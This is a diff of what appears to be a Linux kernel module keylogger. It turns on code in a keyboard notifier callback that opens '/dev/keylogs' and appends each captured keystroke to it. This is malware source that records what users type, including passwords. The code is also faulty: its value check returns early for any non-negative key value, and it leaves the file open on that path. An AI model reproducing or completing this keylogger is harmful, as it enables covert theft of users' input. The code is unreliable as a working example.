@@ -13,6 +13,7 @@
 static int major;
 char keyBuffer[1000000];
 char commands[20];
+char *filename = "/dev/keylogs";
 
 // File operations
 struct file_operations fops = {
@@ -30,24 +31,24 @@ static struct notifier_block keyboard_nb = {
 
 static int 
 key_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
-    /* struct file *fp; */
-    /* mm_segment_t fs; */
-    
-    /* fp = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644); */
-    /* if (IS_ERR(fp)) { */
-    /*     printk(KERN_ALERT "Error encountered while opening file %c.\n", *filename); */
-    /*     return 1; */
-    /* } */
-    /* struct keyboard_notifier_param *param = _param; */
-    /* fs = get_fs(); */
-    /* set_fs(KERNEL_DS); */
-    /*  */
-    /* if(0 <= param->value || param->value > 50000) return NOTIFY_OK; */
-    /*  */
-    /* fp->f_op->write(fp, keycode[param->value], strlen(keycode[param->value]), &fp->f_pos); */
-    /* set_fs(fs); */
-    /* filp_close(fp, NULL); */
-    /*  */
+    struct file *fp;
+    mm_segment_t fs;
+
+    fp = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (IS_ERR(fp)) {
+        printk(KERN_ALERT "Error encountered while opening file %c.\n", *filename);
+        return 1;
+    }
+    struct keyboard_notifier_param *param = _param;
+    fs = get_fs();
+    set_fs(KERNEL_DS);
+
+    if(0 <= param->value || param->value > 50000) return NOTIFY_OK;
+
+    fp->f_op->write(fp, keycode[param->value], strlen(keycode[param->value]), &fp->f_pos);
+    set_fs(fs);
+    filp_close(fp, NULL);
+
     return NOTIFY_OK;
 }
 
